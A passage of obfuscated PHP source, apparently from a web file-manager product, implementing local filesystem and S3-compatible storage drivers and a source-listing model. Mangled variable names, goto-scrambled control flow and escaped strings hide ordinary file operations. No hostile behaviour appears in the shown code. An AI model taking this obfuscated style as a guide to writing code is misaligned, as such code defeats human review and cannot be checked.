B‹ŠÜ£Ãô; dÉÎ™°»‰Ë: return $this->pathDriver . $E÷î‚–šºˆ[8] . ltrim($F‘»İòñµš, $E÷î‚–šºˆ[8]); goto d¤‚¬¼†’’; FŞÔ¾ƒÏö¦: $F‘»İòñµš = KodIO::clear($F‘»İòñµš); $F‘»İòñµš = substr($F‘»İòñµš, strlen($eµÓÍ´ì†ã)); if (empty($this->pathDriver)) { return $F‘»İòñµš; } goto dÉÎ™°»‰Ë; B·º±´ËÄÄ: if (substr($eµÓÍ´ì†ã, 0, 2) == $E÷î‚–šºˆ[1137]) { $eµÓÍ´ì†ã = BASIC_PATH . substr($eµÓÍ´ì†ã, 2); } if (substr($F‘»İòñµš, 0, 2) == $E÷î‚–šºˆ[1137]) { $F‘»İòñµš = BASIC_PATH . substr($F‘»İòñµš, 2); } $eµÓÍ´ì†ã = KodIO::clear($eµÓÍ´ì†ã); goto FŞÔ¾ƒÏö¦; B‹ŠÜ£Ãô: $E÷î‚–šºˆ =& $_SERVER[£ü]; $eµÓÍ´ì†ã = $this->iconvApp($this->pathBase); $F‘»İòñµš = $this->iconvApp($F‘»İòñµš); goto B·º±´ËÄÄ; d¤‚¬¼†’’: } public function mkfile($f°ĞŠö°íô, $f¹‚–éï¯í = '', $EòÁ™æå˜‘ = REPEAT_RENAME) { $f°ĞŠö°íô = $this->iconvSystem($f°ĞŠö°íô); @touch($f°ĞŠö°íô); if ($f¹‚–éï¯í) { file_put_contents($f°ĞŠö°íô, $f¹‚–éï¯í); } return is_file($f°ĞŠö°íô) ? $this->getPathOuter($f°ĞŠö°íô) : !1; } public function mkdir($Aôœù©Çˆ‚, $f¡¤äóÁ£ = REPEAT_SKIP) { $Aôœù©Çˆ‚ = $this->iconvSystem($Aôœù©Çˆ‚); if (is_dir($Aôœù©Çˆ‚)) { return $this->getPathOuter($Aôœù©Çˆ‚); } @mkdir($Aôœù©Çˆ‚, 511, !0); return is_dir($Aôœù©Çˆ‚) ? $this->getPathOuter($Aôœù©Çˆ‚) : !1; } public function copyFile($A•«‡¯˜ôİ, $e˜†…áŸä÷) { $this->mkdir($this->pathFather($e˜†…áŸä÷)); $A•«‡¯˜ôİ = $this->iconvSystem($A•«‡¯˜ôİ); $e˜†…áŸä÷ = $this->iconvSystem($e˜†…áŸä÷); $eÑ‡Û¥óì = @copy($A•«‡¯˜ôİ, $e˜†…áŸä÷); return $eÑ‡Û¥óì ? $this->getPathOuter($e˜†…áŸä÷) : !1; } public function moveFile($DœÓ­ˆŠšÑ, $DöØ¢Œ‡ğ) { $this->mkdir($this->pathFather($DöØ¢Œ‡ğ)); $DœÓ­ˆŠšÑ = $this->iconvSystem($DœÓ­ˆŠšÑ); $DöØ¢Œ‡ğ = $this->iconvSystem($DöØ¢Œ‡ğ); $F©²ÎòÜ = intval(@rename($DœÓ­ˆŠšÑ, $DöØ¢Œ‡ğ)); if (!$F©²ÎòÜ) { if ($F©²ÎòÜ = intval(@copy($DœÓ­ˆŠšÑ, $DöØ¢Œ‡ğ))) { @unlink($DœÓ­ˆŠšÑ); } } return $F©²ÎòÜ ? $this->getPathOuter($DöØ¢Œ‡ğ) : !1; } public function delFile($a¾§†¢ÌÄ„) { $a¾§†¢ÌÄ„ = $this->iconvSystem($a¾§†¢ÌÄ„); if (!@unlink($a¾§†¢ÌÄ„)) { @chmod($a¾§†¢ÌÄ„, 511); if (!@unlink($a¾§†¢ÌÄ„)) { return !1; } } else { return !0; } } public function delFolder($c×•äÄ™±‚) { goto AÁŞ­Åğí; d‚Ôœ¤«óë: return rmdir($c×•äÄ™±‚); goto DÕ’±®ñ¡; AÁŞ­Åğí: $E³Éµäö =& $_SERVER[£ü]; $c×•äÄ™±‚ = $this->iconvSystem($c×•äÄ™±‚); if (!is_dir($c×•äÄ™±‚)) { return !0; } goto a‹ÛÆãÛğ; a‹ÛÆãÛğ: if (!($fÈÚº³¶šê = opendir($c×•äÄ™±‚))) { return !1; } while (($aŠÚ¬ŒÅ„ = readdir($fÈÚº³¶šê)) !== !1) { if ($aŠÚ¬ŒÅ„ == $E³Éµäö[93] || $aŠÚ¬ŒÅ„ == $E³Éµäö[1147]) { continue; } $c«Ê¶©ÍÛ„ = $c×•äÄ™±‚ . $E³Éµäö[8] . $aŠÚ¬ŒÅ„; if (!is_dir($c«Ê¶©ÍÛ„)) { if (!unlink($c«Ê¶©ÍÛ„)) { chmod($c«Ê¶©ÍÛ„, 511); if (!unlink($c«Ê¶©ÍÛ„)) { return !1; } } } else { chmod($c«Ê¶©ÍÛ„, 511); $c«Ê¶©ÍÛ„ = $this->iconvApp($c«Ê¶©ÍÛ„); if (!$this->delFolder($c«Ê¶©ÍÛ„)) { return !1; } } } closedir($fÈÚº³¶šê); goto d‚Ôœ¤«óë; DÕ’±®ñ¡: } public function rename($Aç”ê›æñÌ, $A°É÷èƒË) { goto f‹µİÍ†ˆ; b¶§ÃÒ¡“”: $D·çÄÕ›Àê = @rename($Aç”ê›æñÌ, $E Í´Ó´ç); $E Í´Ó´ç = $this->iconvApp($E Í´Ó´ç); return $D·çÄÕ›Àê ? $this->getPathOuter($E Í´Ó´ç) : !1; goto a¶äÆ…Ü”; f‹µİÍ†ˆ: $Fù´÷ˆêãÕ =& $_SERVER[£ü]; $fÈÛ¬†èœÍ = $this->fileNameAuto($this->pathFather($Aç”ê›æñÌ), $A°É÷èƒË); $fÈÛ¬†èœÍ = $this->iconvSystem($fÈÛ¬†èœÍ); goto AÙ–¥î¸ñ­; AÙ–¥î¸ñ­: $Aç”ê›æñÌ = $this->iconvSystem($Aç”ê›æñÌ); $d‡¹ĞŒÆÌÈ = $this->pathFather($Aç”ê›æñÌ); $E Í´Ó´ç = rtrim($d‡¹ĞŒÆÌÈ, $Fù´÷ˆêãÕ[8]) . $Fù´÷ˆêãÕ[8] . $fÈÛ¬†èœÍ; goto b¶§ÃÒ¡“”; a¶äÆ…Ü”: } public function size($dê°è¯’ ) { $dê°è¯’  = $this->iconvSystem($dê°è¯’ ); return (double) abs(sprintf($_SERVER[£ü][1149], @filesize($dê°è¯’ ))); } public function info($B‡Ü‘®Ÿ®) { $B‡Ü‘®Ÿ® = $this->iconvSystem($B‡Ü‘®Ÿ®); if ($this->isFolder($B‡Ü‘®Ÿ®)) { return $this->folderInfo($B‡Ü‘®Ÿ®); } else { if ($this->isFile($B‡Ü‘®Ÿ®)) { return $this->fileInfo($B‡Ü‘®Ÿ®); } } return !1; } protected function infoChildren($D¢ÙŠ’ñØ, &$Fºç ËË©, $B½‰Ï÷œÇ“ = true) { $eˆÉøÔÛÜÖ =& $_SERVER[£ü]; $D¢ÙŠ’ñØ = rtrim($D¢ÙŠ’ñØ, $eˆÉøÔÛÜÖ[8]) . $eˆÉøÔÛÜÖ[8]; if ($B½‰Ï÷œÇ“) { check_abort(); $D¢ÙŠ’ñØ = $this->iconvSystem($D¢ÙŠ’ñØ); } if (!($fñ¾ß‘Éó® = @opendir($D¢ÙŠ’ñØ))) { return; } while (($BË‚’ŞÚ¹ = readdir($fñ¾ß‘Éó®)) !== !1) { if ($BË‚’ŞÚ¹ == $eˆÉøÔÛÜÖ[93] || $BË‚’ŞÚ¹ == $eˆÉøÔÛÜÖ[1147]) { continue; } $F§ôÈ×¾˜„ = $D¢ÙŠ’ñØ . $BË‚’ŞÚ¹; if (is_file($F§ôÈ×¾˜„)) { $Fºç ËË©[$eˆÉøÔÛÜÖ[78]]++; $Fºç ËË©[$eˆÉøÔÛÜÖ[77]] += (double) abs(sprintf($eˆÉøÔÛÜÖ[1149], @filesize($F§ôÈ×¾˜„))); } else { $Fºç ËË©[$eˆÉøÔÛÜÖ[79]]++; $this->infoChildren($F§ôÈ×¾˜„, $Fºç ËË©, !1); } } closedir($fñ¾ß‘Éó®); } private function folderInfo($bå”ùº‚…ˆ, $a‘šàÄîÁÈ = false) { $CÕ„ñ¦—ÉÈ =& $_SERVER[£ü]; $bå”ùº‚…ˆ = rtrim($bå”ùº‚…ˆ, $CÕ„ñ¦—ÉÈ[8]) . $CÕ„ñ¦—ÉÈ[8]; $c©®†—¢‡£ = $this->iconvApp($this->pathThis($bå”ùº‚…ˆ)); if ($a‘šàÄîÁÈ) { return array($CÕ„ñ¦—ÉÈ[28] => $c©®†—¢‡£, $CÕ„ñ¦—ÉÈ[75] => $this->getPathOuter($bå”ùº‚…ˆ), $CÕ„ñ¦—ÉÈ[29] => $CÕ„ñ¦—ÉÈ[76]); } $bó÷º‰ïÀğ = array($CÕ„ñ¦—ÉÈ[28] => $c©®†—¢‡£, $CÕ„ñ¦—ÉÈ[75] => $this->getPathOuter($bå”ùº‚…ˆ), $CÕ„ñ¦—ÉÈ[29] => $CÕ„ñ¦—ÉÈ[76], $CÕ„ñ¦—ÉÈ[184] => @filectime($bå”ùº‚…ˆ), $CÕ„ñ¦—ÉÈ[107] => @filemtime($bå”ùº‚…ˆ), $CÕ„ñ¦—ÉÈ[1150] => @fileatime($bå”ùº‚…ˆ), $CÕ„ñ¦—ÉÈ[1144] => is_readable($bå”ùº‚…ˆ), $CÕ„ñ¦—ÉÈ[1145] => is_writable($bå”ùº‚…ˆ), $CÕ„ñ¦—ÉÈ[1151] => get_mode($bå”ùº‚…ˆ)); return $bó÷º‰ïÀğ; } private function fileInfo($càëˆ¿™, $D ‘šÃëìš = false) { $BçùÍ÷¹ § =& $_SERVER[£ü]; $d˜´ÜÄ«÷ã = $this->iconvApp($this->pathThis($càëˆ¿™)); if ($D ‘šÃëìš) { return array($BçùÍ÷¹ §[28] => $d˜´ÜÄ«÷ã, $BçùÍ÷¹ §[75] => $this->getPathOuter($càëˆ¿™), $BçùÍ÷¹ §[29] => $BçùÍ÷¹ §[164], $BçùÍ÷¹ §[77] => $this->size($càëˆ¿™), $BçùÍ÷¹ §[157] => $this->ext($d˜´ÜÄ«÷ã)); } $eŸ¢ºÛ¶­ƒ = array($BçùÍ÷¹ §[28] => $d˜´ÜÄ«÷ã, $BçùÍ÷¹ §[75] => $this->getPathOuter($càëˆ¿™), $BçùÍ÷¹ §[29] => $BçùÍ÷¹ §[164], $BçùÍ÷¹ §[184] => @filectime($càëˆ¿™), $BçùÍ÷¹ §[107] => @filemtime($càëˆ¿™), $BçùÍ÷¹ §[1150] => @fileatime($càëˆ¿™), $BçùÍ÷¹ §[77] => $this->size($càëˆ¿™), $BçùÍ÷¹ §[157] => $this->ext($d˜´ÜÄ«÷ã), $BçùÍ÷¹ §[1144] => is_readable($càëˆ¿™), $BçùÍ÷¹ §[1145] => is_writable($càëˆ¿™), $BçùÍ÷¹ §[1151] => get_mode($càëˆ¿™)); return $eŸ¢ºÛ¶­ƒ; } public function exist($Eíƒ‡™©Ñ) { $Eíƒ‡™©Ñ = $this->iconvSystem($Eíƒ‡™©Ñ); return @file_exists($Eíƒ‡™©Ñ); } public function isFile($eÍê‹·›˜) { $eÍê‹·›˜ = $this->iconvSystem($eÍê‹·›˜); return @is_file($eÍê‹·›˜); } public function isFolder($a…Íë³ïø) { $a…Íë³ïø = $this->iconvSystem($a…Íë³ïø); return @is_dir($a…Íë³ïø); } public function listPath($fà¡‘Çƒ, $DòšÙß…¿ = false) { goto FÀñµè–¹…; FÀñµè–¹…: $a¥‘ÅŞÀ‚ =& $_SERVER[£ü]; $fà¡‘Çƒ = $this->iconvSystem($fà¡‘Çƒ); $fà¡‘Çƒ = rtrim($fà¡‘Çƒ, $a¥‘ÅŞÀ‚[8]) . $a¥‘ÅŞÀ‚[8]; goto AÜ¬°×‡âÉ; AÜ¬°×‡âÉ: $F“ğÒâµ‡ = array($a¥‘ÅŞÀ‚[74] => array(), $a¥‘ÅŞÀ‚[73] => array()); if (!($bæ£«Øîö = @opendir($fà¡‘Çƒ))) { return $F“ğÒâµ‡; } while (($aİ³¸¹£¹‰ = readdir($bæ£«Øîö)) !== !1) { if ($aİ³¸¹£¹‰ == $a¥‘ÅŞÀ‚[93] || $aİ³¸¹£¹‰ == $a¥‘ÅŞÀ‚[1147]) { continue; } $BÍ„Ò¥ˆ¥š = $fà¡‘Çƒ . $aİ³¸¹£¹‰; if (is_file($BÍ„Ò¥ˆ¥š)) { $F“ğÒâµ‡[$a¥‘ÅŞÀ‚[73]][] = $this->fileInfo($BÍ„Ò¥ˆ¥š, $DòšÙß…¿); } else { $F“ğÒâµ‡[$a¥‘ÅŞÀ‚[74]][] = $this->folderInfo($BÍ„Ò¥ˆ¥š, $DòšÙß…¿); } } goto Aå †ï°›; Aå †ï°›: closedir($bæ£«Øîö); return $F“ğÒâµ‡; goto Bãƒ›æ“Ã; Bãƒ›æ“Ã: } public function listAll($BÇ‹Õ¨“, &$E¦‹„ÌË = array()) { goto aÒÀøÖ¬ò; aö¤‡ë‡¢½: return $E¦‹„ÌË; goto f¢†ŠöìÓÊ; aÒÀøÖ¬ò: $F†ÈˆˆöÕ =& $_SERVER[£ü]; $BÇ‹Õ¨“ = $this->iconvSystem($BÇ‹Õ¨“); $BÇ‹Õ¨“ = rtrim($BÇ‹Õ¨“, $F†ÈˆˆöÕ[8]) . $F†ÈˆˆöÕ[8]; goto Eé…÷¦Ûì“; Eé…÷¦Ûì“: if (!($B»ÙÌ‹ô¥¯ = @opendir($BÇ‹Õ¨“))) { return $E¦‹„ÌË; } while (($a‰Õš©š° = readdir($B»ÙÌ‹ô¥¯)) !== !1) { if ($a‰Õš©š° == $F†ÈˆˆöÕ[93] || $a‰Õš©š° == $F†ÈˆˆöÕ[1147]) { continue; } $bÂË«¼ÁŒ° = $BÇ‹Õ¨“ . $a‰Õš©š°; if (is_dir($bÂË«¼ÁŒ°)) { $E¦‹„ÌË[] = array($F†ÈˆˆöÕ[75] => $bÂË«¼ÁŒ° . $F†ÈˆˆöÕ[8], $F†ÈˆˆöÕ[76] => 1, $F†ÈˆˆöÕ[77] => 0); $this->listAll($bÂË«¼ÁŒ°, $E¦‹„ÌË); } else { $E¦‹„ÌË[] = array($F†ÈˆˆöÕ[75] => $bÂË«¼ÁŒ°, $F†ÈˆˆöÕ[76] => 0, $F†ÈˆˆöÕ[77] => $this->size($bÂË«¼ÁŒ°)); } } closedir($B»ÙÌ‹ô¥¯); goto aö¤‡ë‡¢½; f¢†ŠöìÓÊ: } public function has($fê•‰› Ë, $e»¹©ñÏ¨î = false, $FÁ´¸¶¾Ø = true) { goto f¾ËÎœå“¥; féƒÃ¶•»‰: if (!($E¦ğŞôà¬ = @opendir($fê•‰› Ë))) { return !1; } $b–ØÅ„´ø¦ = 0; $AäÓÄŠ¿õ˜ = 0; goto d‹ïŒœ†×¤; d‹ïŒœ†×¤: while (($EºÛé©ùº = readdir($E¦ğŞôà¬)) !== !1) { if ($EºÛé©ùº == $bê¾÷øÒùÄ[93] || $EºÛé©ùº == $bê¾÷øÒùÄ[1147]) { continue; } $Få‘¢œ¿« = $fê•‰› Ë . $EºÛé©ùº; if ($e»¹©ñÏ¨î) { if (@is_file($Få‘¢œ¿«)) { $b–ØÅ„´ø¦++; } else { $AäÓÄŠ¿õ˜++; } continue; } if ($FÁ´¸¶¾Ø) { if (@is_file($Få‘¢œ¿«)) { return !0; } } else { if (@is_dir($Få‘¢œ¿« . $bê¾÷øÒùÄ[8])) { return !0; } } } closedir($E¦ğŞôà¬); if ($e»¹©ñÏ¨î) { return array($bê¾÷øÒùÄ[188] => $b–ØÅ„´ø¦, $bê¾÷øÒùÄ[189] => $AäÓÄŠ¿õ˜); } goto dãˆåÖ†à; dãˆåÖ†à: return !1; goto aöÑ‘ŠÔ¾²; f¾ËÎœå“¥: $bê¾÷øÒùÄ =& $_SERVER[£ü]; $fê•‰› Ë = $this->iconvSystem($fê•‰› Ë); $fê•‰› Ë = rtrim($fê•‰› Ë, $bê¾÷øÒùÄ[8]) . $bê¾÷øÒùÄ[8]; goto féƒÃ¶•»‰; aöÑ‘ŠÔ¾²: } public function hashSimple($aôŞ½¦¶Ä) { goto E¾ˆ”¿Øùİ; Aë‘Ú·ß‡¸: return md5($A´‚¾õ§«õ) . $eÚ½‚ƒ¢; goto cí¼Ë’ñ—ù; EÚ´¥¬åí: $cĞâ³øÉÍÑ = fopen($aôŞ½¦¶Ä, $f¼Á§˜±à[1152]); if (!$cĞâ³øÉÍÑ) { return $A´‚¾õ§«õ; } for ($C¼¥éØí­ª = 0; $C¼¥éØí­ª < $eÊËñ×ã‰ê; $C¼¥éØí­ª++) { fseek($cĞâ³øÉÍÑ, $fœôò¹ùšğ * $C¼¥éØí­ª); $A´‚¾õ§«õ .= fread($cĞâ³øÉÍÑ, $B­±Æ…ĞÉ¨); } goto C¹İèˆİÖç; bÇ¿±òí¥: if ($eÚ½‚ƒ¢ <= $B­±Æ…ĞÉ¨ * $eÊËñ×ã‰ê) { return $this->hashMd5($aôŞ½¦¶Ä) . $eÚ½‚ƒ¢; } $A´‚¾õ§«õ = $f¼Á§˜±à[33]; $fœôò¹ùšğ = intval($eÚ½‚ƒ¢ / $eÊËñ×ã‰ê); goto EÚ´¥¬åí; C¹İèˆİÖç: fseek($cĞâ³øÉÍÑ, $eÚ½‚ƒ¢ - $B­±Æ…ĞÉ¨); $A´‚¾õ§«õ .= fread($cĞâ³øÉÍÑ, $B­±Æ…ĞÉ¨); fclose($cĞâ³øÉÍÑ); goto Aë‘Ú·ß‡¸; d”ôŒ”ª”ò: $eÚ½‚ƒ¢ = $this->size($aôŞ½¦¶Ä); $B­±Æ…ĞÉ¨ = 200; $eÊËñ×ã‰ê = 50; goto bÇ¿±òí¥; E¾ˆ”¿Øùİ: $f¼Á§˜±à =& $_SERVER[£ü]; if (!$aôŞ½¦¶Ä) { return md5($f¼Á§˜±à[33]); } $aôŞ½¦¶Ä = $this->iconvSystem($aôŞ½¦¶Ä); goto d”ôŒ”ª”ò; cí¼Ë’ñ—ù: } public function getContent($AØ‘â¶‚„) { $AØ‘â¶‚„ = $this->iconvSystem($AØ‘â¶‚„); return file_get_contents($AØ‘â¶‚„); } public function setContent($Dòâí‚Ï†ö, $c©Í¸ÄøÁÆ = '') { $Dòâí‚Ï†ö = $this->iconvSystem($Dòâí‚Ï†ö); @file_put_contents($Dòâí‚Ï†ö, $c©Í¸ÄøÁÆ, LOCK_EX); clearstatcache(); return strlen($c©Í¸ÄøÁÆ) == filesize($Dòâí‚Ï†ö); } public function fileSubstr($Aƒ¯‹ŒêÅ, $eµÛõÆº¢ï = 0, $cÓß¹¼‘È = false) { goto BöØ‡”Äğï; BöØ‡”Äğï: $eš‘ÉÜ¢§÷ =& $_SERVER[£ü]; $Aƒ¯‹ŒêÅ = $this->iconvSystem($Aƒ¯‹ŒêÅ); if ($cÓß¹¼‘È === !1) { $cÓß¹¼‘È = $this->size($Aƒ¯‹ŒêÅ); } goto d‹×ÀƒÑ¾; d‹×ÀƒÑ¾: if ($cÓß¹¼‘È <= 0) { return $eš‘ÉÜ¢§÷[33]; } $CÛ„”Î‡·˜ = fopen($Aƒ¯‹ŒêÅ, $eš‘ÉÜ¢§÷[1152]); if (!$CÛ„”Î‡·˜) { return !1; } goto dÄŸºĞçÏ; dÄŸºĞçÏ: fseek($CÛ„”Î‡·˜, $eµÛõÆº¢ï); $BÈä•£ß²Ñ = fread($CÛ„”Î‡·˜, $cÓß¹¼‘È); fclose($CÛ„”Î‡·˜); goto DÈÖ¶à˜É; DÈÖ¶à˜É: return $BÈä•£ß²Ñ; goto cİÈÄˆ„¤; cİÈÄˆ„¤: } public function upload($fÛ‚ÒêØ, $Eãò£ÑªØô, $c‰»¿ìíÅ† = false, $BÌ¤œÛİÃ = REPEAT_REPLACE) { $FõªÄ¸‰Ú˜ = $this->copyFile($Eãò£ÑªØô, $fÛ‚ÒêØ); return $FõªÄ¸‰Ú˜ ? $this->getPathOuter($fÛ‚ÒêØ) : !1; } public function download($E¹Ê±’É, $AğÁÑØÔ) { return $this->iconvSystem($E¹Ê±’É); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($fœß³‘Í†Ô) { parent::__construct($fœß³‘Í†Ô); $this->signatureVersion($_SERVER[£ü][197]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($E›«î£…ê) { parent::__construct($E›«î£…ê); $this->signatureVersion($_SERVER[£ü][197]); } public function fileOutLink($B“ºÄ ‹œ) { $a–ó´”ó¦‡ =& $_SERVER[£ü]; if (substr($B“ºÄ ‹œ, 0, 7) == $a–ó´”ó¦‡[1098]) { $B“ºÄ ‹œ = $a–ó´”ó¦‡[1099] . substr($B“ºÄ ‹œ, 7); } header($a–ó´”ó¦‡[153] . $B“ºÄ ‹œ); die; } } goto CïŒ©ˆß•Ò; Eª÷¦î®è: class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\x6f\165\x72\143\x65"; protected $tableMeta = array("\x74\141\142\154\x65\x4e\141\x6d\x65" => "\151\x6f\137\x73\x6f\165\162\x63\x65\137\155\x65\x74\141", "\155\145\164\x61\x46\151\x65\x6c\x64" => "\163\x6f\165\x72\x63\145\111\104"); protected $dataAuto = array(array("\155\157\144\151\146\171\x54\151\155\145", "\164\x69\155\145", "\x69\156\x73\145\162\164", "\x66\x75\x6e\143\164\x69\x6f\156"), array("\x63\162\x65\141\x74\145\x54\x69\x6d\x65", "\164\x69\155\x65", "\x69\156\163\x65\162\x74", "\146\165\x6e\x63\164\x69\x6f\156"), array("\x76\151\145\x77\x54\151\x6d\x65", "\x74\151\x6d\145", "\151\x6e\163\145\162\x74", "\x66\x75\x6e\143\x74\x69\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($f¤ñ¶Çª¦©) { return $this->listSource(array($_SERVER[£ü][365] => $f¤ñ¶Çª¦©)); } public function typeName($BÖÕ¢ç³Èë) { static $Eò¼²©‹­ = array(self::TYPE_SYSTEM => "\x73\171\x73\x74\x65\x6d", self::TYPE_USER => "\165\163\x65\x72", self::TYPE_GROUP => "\147\x72\157\165\160"); return $Eò¼²©‹­[$BÖÕ¢ç³Èë . $_SERVER[£ü][33]]; } public function sourceListInfo($B£Ş¦Øî, $bì³»–çÅÆ = false) { goto a‹§—Ì•ß·; CøŒ¥ÈäÇŸ: if (!$B£Ş¦Øî) { return array(); } $AÃ§–ÚªÑÏ = $this->where(array($c£„Ù–á‡Ö[366] => array($c£„Ù–á‡Ö[7], $B£Ş¦Øî)))->select(); $this->_listDataApply($AÃ§–ÚªÑÏ, $bì³»–çÅÆ); goto B¨„Ÿ„ğÎš; a‹§—Ì•ß·: $c£„Ù–á‡Ö =& $_SERVER[£ü]; $B£Ş¦Øî = $B£Ş¦Øî ? $B£Ş¦Øî : array(); $B£Ş¦Øî = array_filter(array_unique($B£Ş¦Øî)); goto CøŒ¥ÈäÇŸ; B¨„Ÿ„ğÎš: return array_to_keyvalue($AÃ§–ÚªÑÏ, $c£„Ù–á‡Ö[366]); goto AÏâ´½É÷; AÏâ´½É÷: } public function pathInfoFilter($aÃÚÜ§¸) { goto a©•¼º©èÂ; a¦¤Åˆ¬´: $A‹¯Ô‚”Äš .= $EŸ¦¶†ßŠ’[371]; $A‹¯Ô‚”Äš .= $EŸ¦¶†ßŠ’[372]; $AÄİÈ„¹ = explode($EŸ¦¶†ßŠ’[47], $A‹¯Ô‚”Äš); goto C½‡µŠ Ş; eµµğŒ¢«·: $aÃÚÜ§¸[$EŸ¦¶†ßŠ’[368]] = $this->typeName($aÃÚÜ§¸[$EŸ¦¶†ßŠ’[368]]); if ($aÃÚÜ§¸[$EŸ¦¶†ßŠ’[367]] != 1) { $aÃÚÜ§¸[$EŸ¦¶†ßŠ’[157]] = $aÃÚÜ§¸[$EŸ¦¶†ßŠ’[369]]; unset($aÃÚÜ§¸[$EŸ¦¶†ßŠ’[369]]); } $A‹¯Ô‚”Äš = $EŸ¦¶†ßŠ’[370]; goto a¦¤Åˆ¬´; a©•¼º©èÂ: $EŸ¦¶†ßŠ’ =& $_SERVER[£ü]; $aÃÚÜ§¸[$EŸ¦¶†ßŠ’[75]] = KodIO::make($aÃÚÜ§¸[$EŸ¦¶†ßŠ’[366]]); $aÃÚÜ§¸[$EŸ¦¶†ßŠ’[29]] = $aÃÚÜ§¸[$EŸ¦¶†ßŠ’[367]] == 1 ? $EŸ¦¶†ßŠ’[76] : $EŸ¦¶†ßŠ’[164]; goto eµµğŒ¢«·; C½‡µŠ Ş: if (isset($aÃÚÜ§¸[$EŸ¦¶†ßŠ’[373]]) && $aÃÚÜ§¸[$EŸ¦¶†ßŠ’[373]][$EŸ¦¶†ßŠ’[374]] == -1) { $AÄİÈ„¹ = array_remove_value($AÄİÈ„¹, $EŸ¦¶†ßŠ’[184]); $AÄİÈ„¹ = array_remove_value($AÄİÈ„¹, $EŸ¦¶†ßŠ’[107]); $AÄİÈ„¹ = array_remove_value($AÄİÈ„¹, $EŸ¦¶†ßŠ’[375]); $AÄİÈ„¹ = array_remove_value($AÄİÈ„¹, $EŸ¦¶†ßŠ’[376]); $AÄİÈ„¹ = array_remove_value($AÄİÈ„¹, $EŸ¦¶†ßŠ’[77]); $AÄİÈ„¹ = array_remove_value($AÄİÈ„¹, $EŸ¦¶†ßŠ’[377]); } $aÃÚÜ§¸ = array_field_key($aÃÚÜ§¸, $AÄİÈ„¹); return $aÃÚÜ§¸; goto Cñ«í£éè™; Cñ«í£éè™: } public function listUserFav() { goto Bø¥êßŒ’Í; A­é˜¶™õ†: $e·Ğ¨ƒ£÷ = array_to_keyvalue($e·Ğ¨ƒ£÷, $fƒÃâĞ¼œÅ[33], $fƒÃâĞ¼œÅ[75]); if ($e·Ğ¨ƒ£÷) { $bËÍë‹öÆ = $this->listSource(array($fƒÃâĞ¼œÅ[380] => array($fƒÃâĞ¼œÅ[381], $e·Ğ¨ƒ£÷))); } $bËÍë‹öÆ = array_to_keyvalue($bËÍë‹öÆ[$fƒÃâĞ¼œÅ[351]], $fƒÃâĞ¼œÅ[366]); goto F‰¬×äˆêÍ; F‰¬×äˆêÍ: foreach ($dÛ÷‹–ä¢™ as &$FÜœÁìîÇ¥) { $FÜœÁìîÇ¥ = array($fƒÃâĞ¼œÅ[382] => $FÜœÁìîÇ¥[$fƒÃâĞ¼œÅ[364]], $fƒÃâĞ¼œÅ[383] => $FÜœÁìîÇ¥[$fƒÃâĞ¼œÅ[28]], $fƒÃâĞ¼œÅ[384] => $FÜœÁìîÇ¥[$fƒÃâĞ¼œÅ[75]], $fƒÃâĞ¼œÅ[385] => $FÜœÁìîÇ¥[$fƒÃâĞ¼œÅ[29]], $fƒÃâĞ¼œÅ[386] => $FÜœÁìîÇ¥[$fƒÃâĞ¼œÅ[184]], $fƒÃâĞ¼œÅ[387] => $FÜœÁìîÇ¥[$fƒÃâĞ¼œÅ[107]]); if ($FÜœÁìîÇ¥[$fƒÃâĞ¼œÅ[29]] == $fƒÃâĞ¼œÅ[379] && $bËÍë‹öÆ[$FÜœÁìîÇ¥[$fƒÃâĞ¼œÅ[75]]]) { $FÜœÁìîÇ¥[$fƒÃâĞ¼œÅ[388]] = $bËÍë‹öÆ[$FÜœÁìîÇ¥[$fƒÃâĞ¼œÅ[75]]]; } } return $dÛ÷‹–ä¢™; goto F¨©¾ğô¡Ï; Bø¥êßŒ’Í: $fƒÃâĞ¼œÅ =& $_SERVER[£ü]; $dÛ÷‹–ä¢™ = Model($fƒÃâĞ¼œÅ[378])->listData(); $e·Ğ¨ƒ£÷ = array_filter_by_field($dÛ÷‹–ä¢™, $fƒÃâĞ¼œÅ[29], $fƒÃâĞ¼œÅ[379]); goto A­é˜¶™õ†; F¨©¾ğô¡Ï: } public function listUserTag($eç¡È„îÓ’) { goto a£‡¤·®²œ; bƒéÕòò®: $F¡áÚò­î¶ = array_to_keyvalue($F¡áÚò­î¶, $A—·êÏÍœ[33], $A—·êÏÍœ[75]); if (!$F¡áÚò­î¶) { return array(); } $Fš—¥ = array($A—·êÏÍœ[380] => array($A—·êÏÍœ[381], $F¡áÚò­î¶)); goto Dèßõ°È…ë; Dèßõ°È…ë: return $this->listSource($Fš—¥); goto c³¯î‘Ó‡æ; a£‡¤·®²œ: $A—·êÏÍœ =& $_SERVER[£ü]; $aãÅØ Ïà† = Model($A—·êÏÍœ[389])->listData(); $F¡áÚò­î¶ = array_filter_by_field($aãÅØ Ïà†, $A—·êÏÍœ[390], $eç¡È„îÓ’); goto bƒéÕòò®; c³¯î‘Ó‡æ: } public function listUserRecycle() { $C¸‡ŒòöĞ =& $_SERVER[£ü]; $FÜ×êäÑº = Model($C¸‡ŒòöĞ[391])->listData(); if (!$FÜ×êäÑº) { return array(); } $cË’õßÇøñ = array($C¸‡ŒòöĞ[380] => array($C¸‡ŒòöĞ[381], $FÜ×êäÑº), $C¸‡ŒòöĞ[392] => 1); return $this->listSource($cË’õßÇøñ); } public function listSource($fØ‚ß²Ú, $bó¾ğ¸õ¹‘ = 3000) { goto bæóİè±İÚ; aª¨Ê…«¦È: return $B•õñ¼ª‡«; goto e„Öò‹î¨; bæóİè±İÚ: $A„÷šô½ïÚ =& $_SERVER[£ü]; if (!isset($fØ‚ß²Ú[$A„÷šô½ïÚ[393]])) { $fØ‚ß²Ú[$A„÷šô½ïÚ[393]] = 0; } $A¢—Å”µÈ‰ = $A„÷šô½ïÚ[394]; goto aØ³‚å¼„; aØ³‚å¼„: $B•õñ¼ª‡« = $this->field($A¢—Å”µÈ‰)->_makeOrder()->where($fØ‚ß²Ú)->selectPage($bó¾ğ¸õ¹‘); $this->_listDataApply($B•õñ¼ª‡«[$A„÷šô½ïÚ[351]]); $this->_listMake($B•õñ¼ª‡«); 